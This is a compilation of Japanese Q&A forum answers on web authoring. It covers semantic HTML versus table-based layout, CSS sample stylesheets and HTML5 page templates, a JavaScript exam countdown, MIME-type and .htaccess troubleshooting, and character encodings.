それがのような文書構造なのかだけに着目してHTMLを書かなければなりません。 「画像と文章をそれぞれ左から並べて表示させたい」 ためにHTMLを書くのではありません。 HTMLのもっと重要な根幹部分です。Hyper Text Markup Languageです。 すなわち 月々の花 　　1月　　　　　　　　2月　　　　　　　3月　　　　　4月 　サクラソウ　 ニオイスミレ　わすれな草　ローズ 　　説明　　　　　　説明　　　　　説明　　　　説明 てしたら、table(表)でマークアップすべきです。 単に画像と説明からなるリストでしたら 写真 　その説明 写真 　その説明 写真 　その説明 とマークアップすべきです。 ★決してしてはならないこと!! ・画像とその説明のリストなのに、表でマークアップすること ・同様にデザインのために<div>でくくる事。 　<div>は、 「DIV要素とSPAN要素は、id属性及び class属性と併用することで、文書に構造を付加するための一般機構を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」ためのもので、決してデザインのためではありません。 　これらは、仕様書を読めば誰でもわかる形で随所に書かれています。 すなわち、それをどのように表示させたいか、 「画像と文章をそれぞれ左から並べて表示させたい」・・・ は、プレゼンテーションの問題です。 →2.4.1 構造とプレゼンテーションの分離 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　たぶん画像とその説明のリストをスタイルシートを用いて、「画像と文章をそれぞれ左から並べて表示させ」るのがよいと思います。さすればディスプレイの幅が小さいときは、少ない列数で、広いときは多くの列数で、さして最低でも3列、多いときでも6列とか制限をかけることもできます。 ・表でもないのに表でマークアップする ・デザインためにHTMLを書かない<div>を使うとか 　これだけは、最低限しないように
#移行はURLの一部ではありますが、それより前は本来のなすりです。 　#以降の部分識別子はブラウザに保存され、サーバーには送信されません。 URLでサーバーに送られる要求の http:　　　　　プロトコル // 　　　　　　インターネット hoge.com 　　　ドメイン /abc/efg/hijk　PATH_INFO ?以降　　　　　QUERY_STRING 　はご存知だと思います。 　QUERY_STRIMG が、かっこ悪い--ではなくて、セキュリティ上問題がある場合には、PATH_INFOや標準入力を使います。 　その方法を使うのでしたら、メールで標準入力は使えませんからQUERY_STRINGないし、PATH_INFOで情報を渡し、サーバー側でスタイルシートを書き換えて出力させるのが良いでしょう。javascriptではセキュリティ上難しいでしょう。 [例] http：//hoge.com/abc/efg/hij/klm でURL示す。 サーバーはabcというCGIプログラムで、ページを作成し、その時点でのPATH_INFO(/efg/hij/klm)のページを表示し、そのページでスタイルシートの呼び出し先(rel)で、スタイルシートをことなる指定するか、スタイルシートもCGIで出力して、HTTP_REFERERからスタイルシートを書きかえる。 　簡単な方法として思い浮かぶのはこの程度ですが、「労多くして功少なし」の感を否めません。 　#2.1.2 部分識別子 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )は、ページ内の特定の位置(一意の場所)を示す重要なものです。決したかっこ悪いものではありません。↑のように。
HTML文でカレンダーを作り、そこから大きな字のHTMLに飛ぶようにしておけばいいです。 エクセルでも同じようなことが出来るでしょう。
No.1です。 dl.photoList dt,dl.photoList dt{display:block;list-style-type:none;margin:0;padding:0;} dl.photoList dt{ ＿border:solid 1px gray; ＿width:590px;margin:0 auto; ＿height:200px; ＿padding-left:210px; } dl.photoList dt+dd{ ＿position: } は不要でした。dl(定義リスト)でやってみようと思った名残です。 ちょっと、かっこよく修正・・ ul.photoList,ul.photoList li{display:block;list-style-type:none;margin:0;padding:0;} ul.photoList li{ ＿border:solid 1px gray; ＿width:800px;margin:5px auto; ＿position:relative; } ul.photoList li a{ ＿position:absolute;left:-2px;top:-2px; ＿display:block;width:200;height:200; ＿display:none; } ul.photoList li a img{ ＿display:block; ＿border:solid gray 0.5px; ＿border-radius:10px; ＿box-shadow: 5px 5px 10px rgba(0,0,0,0.8); } ul.photoList li img:hover+a, ul.photoList li a:hover{ ＿display:block; } ul.photoList li ul li{ ＿position:absolute; ＿width:auto; ＿top:0;left:210px; ＿border:none; } ul.photoList li ul li+li{ ＿right:10px; ＿text-align:right; } ul.photoList li ul li+li+li{ ＿top:30px; ＿text-align:left; ＿text-indent:1em; ＿font-size:1.2em; ＿text-indent:1em; }
物事を学ぶには順番があります。どうもHTMLの基本が出来ていないようです。 HT<L4.01が勧告されて以来、「HTMLは文書構造だけを記述し、プレゼンテーションはスタイルに任せる」とそれてきました。 　→「スタイルシートはHTMLのマーク付けを簡素化し、またHTMLをプレゼンテーションの負担から大きく解放する。スタイルシートは、著者とユーザに対し、フォント情報、配置、色等の文書のプレゼンテーションを制御する手段を提供する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )」 　あなたの書かれているHTMLは、複雑怪奇で読むのも大変です。 ★デザインのためにtableを使うべきではありません。 　→『単に文書内容を整形する目的だけで表を用いるべきでない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 　→『ページレイアウトの目的で表を用いる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 ★可能な限りjavascriptは使わない!!特にナビゲーションなど 　→『JavaScript、などの特殊な機能が使用されているためにサイトの一部がテキスト ブラウザで表示されない場合、検索エンジンのスパイダーがサイトをうまくクロールできない可能性があります。 ( http://support.google.com/webmasters/bin/answer. … )』 　単純に <body> <div class="header"> 　<h1>熊本県でお風呂のリフォーム・修理をお考えの方はお気軽にご相談ください。</h1> 　<div class="nav"> 　　<ul> 　　　<li><a href="/">TOP</a></li> 　　　<li><a href="/books">BOOKS</a> 　　　　　<ul> 　　　　　　　<li><a href="/books/1">著書1</a></li> 　　　　　　　<li><a href="/books/2">著書2</a></li> 　　　　　</ul> 　　　</li> 　　　<li><a href="/profile">Profila</a></li> 　　</ul> 　</div> </div> <div class="section"> 　<h2>見出し</h2> 　・・・【中略】・・・ </div> <div class="footer"> </div> </body> でよいです。これ以外一切記述する必要はありません。 HTML5で書くと <body> <header id="TOP"> 　<h1>熊本県でお風呂のリフォーム・修理をお考えの方はお気軽にご相談ください。</h1> 　<nav> 　　<ul> 　　　<li><a href="/">TOP</a></li> 　　　<li><a href="/books">BOOKS</a> 　　　　　<ul> 　　　　　　　<li><a href="/books/1">著書1</a></li> 　　　　　　　<li><a href="/books/2">著書2</a></li> 　　　　　</ul> 　　　</li> 　　　<li><a href="/profile">Profila</a></li> 　　</ul> 　</nav> </header> <section> 　<h2>見出し</h2> 　・・・【中略】・・・ </section> <footer> </footer> </body> です。class名は『id属性及び class属性と併用することで、文書に構造を付加するため ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』です。 　これだと、文書構造が一目でわかりますよね。HTML5の『新しい要素 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … )』が、どのようなclass名をつけるかの具体的な参考になるでしょう。 　HTMLがきちんと書かれていたら、スタイルシートも簡単になります。 div.header, div.section, div.footer{ 　　margin:0 auto; 　　width:70%;min-width:480px;max-width:800px; } div.nav ul,div.nav ul li{ 　display:block;list-style-type:none; 　margin:0;padding:0; 　text-align:center; } div.nav ul li{width:25%;float:left;position:relative;} div.nav ul li ul li{float:none;width:100%;} div.nav ul li ul{display:none;} div.nav ul li:hover ul{display:block;} div.nav ul li a{display:block;text-decoration:none;width:100%;height:100%;} とかで済むはずです。 id(一意セレクタ#)は、できるだけ使わない--スタイルシートを煩雑にする大きな原因です。きちんとセレクタを書きましょう。 ★ですが、まずHTMLを基礎から復習すること。 ★それが出来るようになったら、スタイルシートをきちんと学びましょう。 　あやふやなサイトで勉強したってダメです。 　一番確実なのは仕様書を読むこと。 ★最初はシンプルなスタイルシートを書いて、fontとかcolorとか細かい指定は後回しです。
多分ですが、 widthとheightの領域をしっかり取ってますか？ 取らないとよく崩れたりします。 また、clearfixも使って領域確保してあげないとボックス突き破ったり しますので、関連サイト等を見てやってみてくださいませ(*´∀｀)
こんにちは。 他の人に反映する場合はサーバ側での処理が必要になります。 PHP、perl、Java等言語は問いません。 サーバ側に値を保存して、アクセス時に参照して表示してあげます。
http://helps.ameba.jp/faq/blog/import/post_436.h … バックアップ機能もついていないようですし、無理ではないでしょうか。 同じ製品のページをたくさん作るという事に問題があると思います。 追加するのではなく、 以前投稿したページをその都度編集（更新）すれば、同じ製品の違う情報が氾濫する事はなくなると思います。
　なら、実際に初歩的なサンプルを、スマホ・幅広ディスプレイ対応、印刷時は別のスタイル。 ・・もっとも基本的なヘッダー・３カラムのセクション・フッターの５カラム構成です。 左右に来るブロックが本文ブロックより長くなる可能性があれば、本文ブロックにmin-heightを指定しておけば良いです。 <!doctype html> <head> ＿<meta charset="utf-8"> ＿<title>サンプル</title> ＿<meta name="author" content="IRUKA"> <style media="screen"> <!-- html,body{margin:0;padding:0;background-color:gray;} body>header,body>section,body>footer{ width:80%;min-width:480px;max-width:800px; margin:0 auto; background-color:silver; } h1,h2,h3,p{margin:0 1em;line-height:1.5em;} p{text-indent:1em;} pre{width:90%;margin:0 auto;background-color:white;padding:0.2em;} body>section{position:relative;min-height:400px;} section section{margin:0 20%;min-width:0;} #contentTable, body>section>aside{ ＿position:absolute; ＿top:0; ＿width:19%;height:100%; ＿margin:0; ＿background-color:yellow; } #contentTable{left:0;} body>section>aside{right:0;} address{text-align:right;} --> </style> <style media="print"> p{margin:0 1em;text-indent:1em;line-height:2em;} </style> </head> <body> ＿<header id="Top"> ＿＿<h1>サンプル</h1> ＿</header> ＿<section> ＿＿<section id="question"> ＿＿＿<h2>質問</h2> ＿＿＿<p> ＿＿＿＿ＨＴＭＬの記述がヘッダ⇒左メニュー⇒真ん中のコンテンツ⇒右カラム⇒フッタという感じになっています。 ＿＿＿</p> ＿＿＿<p> ＿＿＿＿で、左メニューとコンテンツと右カラムにフロートを設定してます。 ＿＿＿</p> ＿＿＿<p> ＿＿＿＿↑の一番の問題点は、h1タグの次にh3タグが<del>着て</del><ins>来て</ins>しまうことだと思います。 ＿＿＿</p> ＿＿＿<p> ＿＿＿＿そこで、これじゃまずいと思い、ＴＯＰページからいじり始めました。しかし、この方法でよいのかがわからないので、すべてのページに反映する前に質問させてください。 ＿＿＿</p> ＿＿＿<p> ＿＿＿＿しかし、これだと問題があり、コンテンツのたての幅が左右のカラムよりも短いと、左右のカラムがフッタに突き刺さってしまいます。。。（作者についてのページが若干そうなっています…実際にはフッタの前に広告があるのでたいした問題ではなさそうですが） ＿＿＿</p> ＿＿＿<p> ＿＿＿＿ただ、実際のところ、小説の長さが左右のカラムよりも短いということはありえなさそうなので…このサイトに関してはこの方法でも大丈夫だと思うのですが、他のサイトに流用できそうにもないので… ＿＿＿</p> ＿＿</section> ＿＿<section id="answer"> ＿＿＿<h2>回答</h2> ＿＿＿<pre>　&lt;heqder&gt; 　　&lt;h1&gt;文書の見出し&lt;h1&gt; 　　&lt;div class="abstract"&gt;要約&lt;/div&gt; 　&lt;/header&gt; 　&lt;section&gt; 　　本文 　　目的 　　操作 　　結果 　　考察 　　結論やまとめ 　　&lt;div class="references"&gt;参考文献&lt;/div&gt; 　　&lt;div class"contentTable"&gt;インデックス&lt;/div&gt; 　&lt;/section&gt; 　&lt;footer&gt; 　　あとがき 　&lt;/footer&gt;</pre> ＿＿＿<p> ＿＿＿＿この文書構造にしたがってスタイルシートでデザインしていきますから、 ＿＿＿</p> ＿＿＿<pre>/*本文は・・*/ body>section{position:relative;} body>section>*{margin:0 20%;} /* 本文中の参考文献と目次は */ section div.references,section div.contentTable{ 　width:20%;height:100%; 　position:absolute;top:0; } section div.references{left:0;} section div.contentTable{right:0;}</pre> ＿＿＿<p> ＿＿＿＿だけでよいはずです。 ＿＿＿</p> ＿＿</section> ＿＿<section id="contentTable"> ＿＿＿<ul> ＿＿＿＿<li><a href="#Top">トップ</a></li> ＿＿＿＿<li><a href="#question">質問</a></li> ＿＿＿＿<li><a href="#answer">回答</a></li> ＿＿＿</ul> ＿＿</section> ＿＿<aside> ＿＿＿<h3>付録</h3> ＿＿＿<p> ＿＿＿＿ここには、本文と直接関係ない記事などを書いておく ＿＿＿</p> ＿＿</aside> ＿</section> ＿<footer> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2005-06-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2005-06-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2001 - 2004 All Rights Reserved mailto:*****</address> ＿</footer> </body> </html>
結論だけ言いますと、これを削除します。 <p id="s1msgH"></p> このPタグがs1msgHのCSS設定でちょうど上にかぶさるように配置されているのです。
500エラーは.htaccessの記述が誤っているときにも出ますね（最後に改行がないとか）。 >他のツールを使ったら どういうツールを使われましたか？WindowsとUnixでは生成するパスワードが違いますので流用は出来ません。
＜html＞ ＜head＞ ＜title＞＜/title＞ ＜script type="text/javascript"＞ ＜!-- function msg() { var date = new Date(); var dt1 = new Date(2012, 9 - 1, 9); var dt2 = new Date(date.getFullYear(), date.getMonth(), date.getDate()); var days = ( dt1 - dt2 ) / 86400000; alert("試験まであと" + days + "日です"); } //--＞ ＜/script＞ ＜/head＞ ＜body＞ ＜form＞ ＜INPUT TYPE="button" VALUE="残日数を表示" onClick="msg()"＞ ＜/form＞ ＜/body＞ ＜/html＞
ログインする仕組みでユーザーをサーバーが管理する仕組みが必要でしょう。 ただし１日１回アクセスということは、内容を忘れても再度参照できないという ユーザビリティ的には最悪な仕組みです。 であれば１日何回アクセスしても同じ結果を表示する仕組みの方がいいと思います。 （それにしてもログインする仕組みが必要ですが）
HTMLにはそのような仕組みはありません。無理やり分割するにはtableを使うとかですが、それは間違った方法です。 →単に文書内容を整形する目的だけで表を用いるべきでない。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) →ページレイアウトの目的で表を用いる。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　HTMLは、単に文書をそれを構成する要素に分割して、それが同様な構成要素であるかをマークアップする文法に過ぎません。 　それをどのように表現するかは、もっぱらスタイルシートで行います。 　^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^とても大事なところ。 　この場合、左右の文章がどのような要素であるかが必要です。 ・目次と本文なら、そのようにHTMLを書いてください。(左右は考えない) ・左側が本文で、右側が脚注のようなものなら、そのようにHTMLを書いてください。(左右は考えない) ・ひとつの長い文書を段組で表示するなら、ひとつの長い記事としてHTMLを書いてください。 　---その上で、スタイルシートで配置を決めます。 　　スタイルシートについては、 Webデザイン・CSS - 教えて！goo ( http://oshiete.goo.ne.jp/category/258/ ) 　のほうが良いかもしれません。(教えてgooの場合)
＞ネットオークションによく使われる商品説明に使用したく質問致しました。 　その場合は、HTMLの制限でスタイルシートが使えないことがあります。 　根本的に見直さないとなりません。 　原則、HTMLと属性だけで指定することになります。 　<table width="90%" border="1"> 　　<tbody> 　　　<tr> 　　　　<th width="80">サイズ</th> 　　　　<td>なんたらかんたら</td> 　とかにならざるを得ません。サイズ指定は一行目だけで良いです。 　私は <table border="0" width="100%"> 　<tbody> 　　<tr> 　　　<td width="10%"></td> 　　　<th width="80%">商品説明</th> 　　　<td></td> 　　</tr> 　　<tr> 　　　<td> 　　　　<table border="1"> 　　　　　<tbody> 　　　　　　<tr> 　　　　　　　<th width="6">商品名</th><!--もっとも長い見出し項目 --> 　　　　　　　<td colspan="3">なんたらかんたら・・</td> 　　　　　　</tr> 　　　　　　<tr> 　　　　　　　<th>機種・型番</th> 　　　　　　　<td>機種名・・</td> 　　　　　　　<th>メーカーサイト</th> 　　　　　　　<td><a href="[URL]">なんとか</td> 　　　　　　</tr> 　　　　　　・・・・・・以下省略 　　　　　</tbody> 　　　　</table> 　　　</td> 　　</tr> 　</tbody> </tabel> とかをテンプレートにしています。
あわわわっ・・・表示されないですか(´・ω・` ) ツイートボタンにも種類があるので他のものを試してみるという手もあるのでは… 参考サイト↓ http://128bit.blog41.fc2.com/blog-entry-253.html http://areda.blog9.fc2.com/blog-entry-1259.html
＞とりあえず、自分で再構築してみます! 　それが一番です。 　ただ、あまり使われないプロパティなのでヒントだけ ★<li><a href=""><img src="" width="" height="" alt=""></a> 　の場合は、visibilityプロパティで元の画像を消します。それ以外の指定は従来どおり ★<li><a href="">テキスト</a> 　の場合で、テキストを消して画像を使う場合は、 　　<li><a href=""><span>テキスト</span></a> 　でvisibilityでテキストを消して背景画像を指定し 　印刷時にはcontentで画像を追加。 ★<li><a href="">テキスト</a> 　の場合(画像は背景でテキストは生かしておく)は、 　印刷時(media=print)には、contentプロパティで画像を追加するか、なにもしない。 　最下段の方法がもっとも良いとは思います。なんといってもHTMLがシンプルですし、SEOとしても、あらゆる端末に対しても・・ 　その上は、次善の策です。ただspanで文字を消すのは将来的にSEO的にまずくなるかも・・ 　最初の方法は、後方互換性はもっとも良いでしょう。 　 　
ブラウザは？？ ブラウザによって削除方法が違いますので・・・
＞やっぱり無理ですかね？ 　あなたがどこかで、背景を白にしているからです。 　 簡単なサンプルです。 ★タブは＿に置換してあるので戻す [index.html] <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>サンプル</title> ＿<meta name="author" content="ORUKA1951"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rev="made" href="mailto:oruka1951@hoge.com" title="send a mail" > ＿<link rel="START" href="../index.html"> ＿<style type="text/css"> <!-- html,body{margin:0;padding:0;} body{background:url(./images/background/sky.jpg) rgb(200,200,255)} div.header,div.section,div.footer{margin:0 auto;width:80%;position:relative;} div.section>*{margin-left:22%;width:78%;} div.section p.object object{display:block;position:absolute;top:0;left:0;width:20%;height:100%;border:solid red 1px;margin:0;} --> ＿</style> </head> <body> ＿<div class="header"> ＿＿<h1>タイトル</h1> ＿＿<p>このページでは・・・・</p> ＿</div> ＿<div class="section"> ＿＿<h2>見出し</h2> ＿＿<p>・・・</p> ＿＿<p>・・・</p> ＿＿<p>・・・</p> ＿＿<p>・・・</p> ＿＿<p>・・・</p> ＿＿<p>・・・</p> ＿＿<p>・・・</p> ＿＿<p>・・・</p> ＿＿<p class="object"> ＿＿＿<object type="text/html" data="menue.html" width="200" height="200"> ＿＿＿＿ご利用のブラウザはobjectに対応していません。<a href="menue.html"></a>をご覧ください。 ＿＿＿</object> ＿＿</p> ＿</div> ＿<div class="footer"> ＿＿<h2>文書情報</h2> ＿＿<dl class="documentHistry"> ＿＿＿<dt id="FIRST-PUBLISHED">First Published</dt> ＿＿＿<dd>2005-06-10</dd> ＿＿＿<dt id="LAST-MODIFIED">Last Modified</dt> ＿＿＿<dd>2005-06-10 12:00:00 (JST)</dd> ＿＿</dl> ＿＿<address>&copy; ORUKA1951 2001 - 2004 All Rights Reserved mailto:*****</address> ＿</div> </body> </html> [menue.html] <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"> <html lang="ja"> <head> ＿<meta http-equiv="content-type" content="text/html; charset=Shift_JIS"> ＿<title>Untitled</title> ＿<meta name="author" content="IRUKA"> ＿<meta http-equiv="Content-Script-Type" content="text/javascript"> ＿<meta http-equiv="Content-Style-Type" content="text/css"> ＿<link rel="START" href="../index.html"> ＿<link rel="NEXT" href="./page1.html"> ＿<link rel="SHORTCUT ICON" href="/favicon.ico"> ＿<link rel="ICON" href="/favicon.ico"> </head> <body> ＿<ul> ＿＿<li>あいうえお</li> ＿＿<li>かきくけこ</li> ＿＿<li>そしすせそ</li> ＿＿<li>たちつてと</li> ＿</ul> </body> </html>
先のサンプルを実行してその仕組みを理解していただかないと理解していただくのは無理です。 No.2で示したリンク先の記事を読んで理解して置いてください。 1) iframeはあくまで行内要素ですから巾を指定することは本来は出来ませんが、 　display:block; 　width:75%; 　とすると、iframeを含む、static以外の抱合コンテナブロックのサイズを計算の基準に出来ます。 　staticは、positionプロパティのとりうる値で、static | relative | absolute | fixed | inheritがあります。 　→9.3.1 配置体系を選択する ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 2) 高さについては、blockは親コンテナブロックのサイズを参照しますから、ここでの指定できるのは(1)と同様親ブロックのサイズです。それがなければ、HTMLのheight属性で指定されたものがデフォルトとして利用されます。 　→6.4 カスケード処理（The cascade） ( http://www.swlab.it.okayama-u.ac.jp/man/rec-css2 … ) 3) iframeで呼び込まれたHTML内の画像については、呼び込むHTML側では一切指定できません。これは理解できると思います。No.3のサンプルを試す必要があります。 4) 読み込まれたHTML--youtubeのページの画像サイズ指定に従います。 　youtubeの画像指定には、No.3で示した呼び出されるページのようなスタイルシートはありませんから、横幅にしたがって伸縮しません。実際にyoutubeのページでもウィンドウサイズを変更しても画像サイズは変わりませんね。 　No.3で示した呼び出される側のHTMLは、それだけを開いたとき、ウィンドウサイズによって画像サイズが伸縮しましたよね。 　あなたが、作成したページを呼び出すのでしたら、そのページをNo.3の呼び出されるHTMLのように作成しなおせば可能です。 　すなわち、埋め込まれるHTMLをあなた自身が作成しなければなりません。 　youtubeの動画はobjectで埋め込むことが可能ですから、iframeを使わず、objectで埋め込んでobjectをblockに変換して、width:75%;height:auto;とすれば期待通りに出来るはずです。
　縦書きは、最終的にCSS3でも採用されません。当初の案にはあったのですが、早々に破棄されました。 　縦書きという特殊な状況については無理でしょう。 　縦書きの場合、widthを行の長さにするのか、列数にするのかで、９０度異なる対象になってしまいます。 様々な理由で、私は縦書きは使いません。その必要があるときはPDFにします。この二つは根本的な理念が異なります。 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから HTMLは、どんな環境からもWebの情報を利用できるようにすべきだという方針の下に開発されている。例えば、様々な解像度や色深度のグラフィックディスプレイを持つPCや、携帯電話、モバイル機器、音声入出力機器、帯域が広いコンピュータや狭いコンピュータ、等の環境である。 ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Introduction to HTML 4 (ja)( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )］より 【引用】＿＿＿＿＿＿＿＿＿＿＿＿ここから 特定の環境に左右されずに全ての環境でほぼ同様の状態で文章や画像等を閲覧できる ￣￣￣￣￣￣￣￣￣￣￣￣￣ここまで［Portable Document Format - Wikipedia( http://ja.wikipedia.org/wiki/Portable_Document_F … )］より ★私はウェブサイトでは「どんな環境からもWebの情報を利用できるようにすべきだ」と考える場合はHTMLを使用し、「(PDFが利用できる)全ての環境でほぼ同様の状態で文章や画像等を・・」の場合だけPDFを使ってます。
iframe内のHTMLにありますけど・・ Firebug ( https://addons.mozilla.jp/firefox/details/1843 )を使えばすぐわかりますよ。 http://www.softpal.co.jp/unisonshift/products/pr … 　画像自体は根適当なDraw(ベクタ)系のソフトで作成するのが簡単で良いでしょう。Illustratorとかが有名ですが、Corel DrawとかInkscapeとか・・・ ★2次元コンピュータグラフィックス - Wikipedia ( http://ja.wikipedia.org/wiki/2%E6%AC%A1%E5%85%83 … ) 1) ボタンを角丸長方形で作成 2) グラデーションで着色 3) ベクター画像を重ねる。 4) 切り抜く 5) 切り取られた部分を少し色調を変えてグラデーション 6) 文字を書く 7) 文字の色、書体、縁取り、影をつける。 8) 赤の自由曲線の背景 9) 黄色で文字を書き重ねる。 10) 全体を見ながら位置や色、影の長さなどを調整する。 11) 最後にGIGかPINGで出力する。 　・・・数分で済む作業です。
サーバーのMIME-type指定が異なるのではないですか？ HTMLファイル(小文字じゃない)のダウンロードが始まるというのは通常では考えられません。mime-typeがtext/htmlの場合 はブラウザで表示されるはずです。 　ファイルの拡張子の有無やその値がわかりませんが、通常HTTPDでは、デフォルトでは、不明なファイルはtext/plainになっているので、拡張子がない場合はテキストファイルとして提供しますが、新しいサーバーでは、何らかの理由でtext/p;ain以外で提供されている可能性があります。 ・？対策でoctet-streamにしてある。 ・その拡張子に対して、あなたのブラウザがダウンロードする応答ヘッダを付加している。 ・その拡張子またはファイル名に対してoctet-streamが指定してある。 などなど 　firefoxをお使いでしたら、Live HTTP Headersと言うアドオンがありますから、それでサーバーにそのファイルを要求したとき(=URL欄にURLを記入してEnter)に、どのようなHTTPヘッダーが送られてくるかを確認してください。その応答ヘッダーに書かれているmime-typeについて、あなたのブラウザでどのように処理するかを指定するか、.htaccessで応答ヘッダを書き換えるか、サーバー管理者に連絡してmime-typeを変更してもらってください。
「HTMLユニコード」と言うんでしょうかね。 http://code.cside.com/3rdpage/jp/unicode/convert … とかで変換もできるようで。
あせりすぎです。 まず、わかりやすいHTML4.01strictを徹底的に身につけましょう。HTML4.01では基本的にブロック要素と行内要素しかありませんが、HTML5では メタデータ・コンテンツ フロー・コンテンツ セクショニング・コンテンツ ヘッディング・コンテンツ フレージング・コンテンツ エンベッディッド・コンテンツ インタラクティブ・コンテンツ と分けて考えます。それぞれがどのコンテンツに含まれるかがきちんと決まっています。 　HTML4.01でも <body> <img src="画像url" usemap="#画像url"> <map name="画像url"> <area shape="rect" coords="0,0,500,500" href="画像" alt="画像"> </map> </body> この様な書き方は認められていません。 　IMG要素は行内要素ですから、bodyには含むことができません。 <!ELEMENT BODY O O (%block;|SCRIPT)+ +(INS|DEL) -- document body --> 　と書かれています(7.5.1 BODY要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) 　これは、 BLOCKは、要素であり、開始タグも終了タグも省略できる(0 0)が、ブロック要素%blockとスクリプト(script)をひとつ以上(+) INSとDEL要素を含むことができる--文書の本文を示す 　と読みます。 MAP要素については、 →13.6.1 クライアント側イメージマップ: MAP要素とAREA要素 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … ) を参照。 　ブロック要素には、 P %heading; h1～h6　、%list;　　ul,ol　、%preformatted　、DL　、 DIV　、NOSCRIPT　、BLOCKQUOTE　、FORM　、HR　、TABLE　、FIELDSET ADDRESS 要素があります。 よって、HTML5であっても最低限・・ <body> 　　<p><img src="画像url" usemap="#画像url"></p> 　　<p> 　　　<map name="画像url"> 　　　　<area shape="rect" coords="0,0,500,500" href="画像" alt="画像"> 　　　</map> 　　</p> </body> 　でなければなりません。 　その後、それぞれのブロック要素について配置をしていきます。スタイルシートで行内要素とブロック要素は変更できますが、そのためにはHTMLをちゃんと書いておかなければなりません。 ★HTML4.01strictを身につけていれば、HTML5だろうと 　HTML5 における HTML4 からの変更点 ( http://standards.mitsue.co.jp/resources/w3c/TR/h … ) 　を読むだけで理解できるでしょう。 　いずれにしてもHTMLは文書構造をマークアップするもので、プレゼンテーション--デザインのためのものではありません。そのもっとも基本的な部分を、しっかりおさらいをしてください。それからでも遅くない---というか、そのほうがはるかに早く上達できるでしょう。 注) HTML4.01にも色々ありますが、あくまでここで言うものはHTML4.01strictです。 『HTML文書を作る場合には、この仕様における、他のDTDセットではなく strict DTD に適合する文書を作るよう推奨する。 ( http://www.asahi-net.or.jp/%7Esd5a-ucd/rec-html4 … )』 とにかくHTML4.01strictをしっかり身につけること。書いたらvaidatorでチェックしては指摘されたところを直す・・その繰り返しです。 ★Another HTML Lint ( http://www.htmllint.net/ ) 　でHTML4.01strictで作成チェックすること・・・ 　下記サンプルはHTML5+CSS3ですが、未対応のブラウザが多いので現状はHTML4.01で作成する必要があります。そのときは、HTML5の新しい要素はdivにclass名をつけます。 <header>→<div class="header"> [例]　タブは＿に置換してありますから戻すこと。 <!doctype html> <head> ＿<meta charset="utf-8"> ＿<title>サンプル</title> ＿<meta name="description" content=""> ＿<meta name="author" content="IRUKA"> <style media="screen"> <!-- section figure{position:relative;} section>figure.main img{ ＿display:block; ＿width:40%; ＿height:auto; ＿margin:0 auto; ＿border-radius:20px; ＿box-shadow: 10px 10px 10px 10px rgba(0,0,0,0.4); } --> </style> </head> <body> ＿<header> ＿＿<h1 id="title">Your title</h1> ＿＿<nav> ＿＿＿<ul> ＿＿＿＿<li><a href="#">Some</a></li> ＿＿＿＿<li><a href="#">navigation</a></li> ＿＿＿＿<li><a href="#">links</a></li> ＿＿＿</ul> ＿＿</nav> ＿</header> ＿<section> ＿＿<h2>本文見出し</h2> ＿＿<p>画像を横幅の40%幅(縦横比変更なし)で中央に角丸影つきで配置する。</p> ＿＿<figure class="main"> ＿＿＿<img src="[url]" width="480" height="360" alt=""> ＿＿</figure> ＿</section> ＿<section> ＿＿<h2>A smaller heading</h2> ＿＿<p> ＿＿</p> ＿</section> ＿<footer> ＿＿<h3>A nice footer</h3> ＿</footer> </body> </html>
UTF-8とはユニコードのことで、少し乱暴な言い方になるかも知れませんが、 一つのページ上に、様々な文字を表示するための文字表示のルールです。 文字コードは、UTF-8以外にも沢山あります。 日本語だと、シフトJISや、EUCなどがあります。 例えばシフトJISのコードで表示されると、中に中国語や韓国語など日本語にない文字が入っていると、 文字化けしてしまうのです。 逆に言えばUTF-8を使えば、同じページ上に日本語や中国語が混在したページを作ることができます。 以前の日本のホームページはシフトJISやEUCで書かれていることがほとんどでした。 ですが、最近ではUTF-8で書かれていることが増えています。 例えばYahooのトップページも以前はEUCで書かれていましたが、いつの間にやらUTF-8になっていますね。 これもグローバル化の一つなのでしょうか。 Twitterなど世界展開しているページだとある意味必須ですよね。いちいち言語切り替えしなくてもいいのですから。 文字コードとページの翻訳はあまり関係ありません。機械翻訳だとかなり難解な文章になるでしょう。 なお、いずれにしろ文字化けを誘発する恐れがありますので、ホームページを作ったら、文字コードの宣言(指定)は必ず行いましょう。 <meta http-equiv="content-type" content="text/html; charset=utf-8"> ↑こんな感じです。
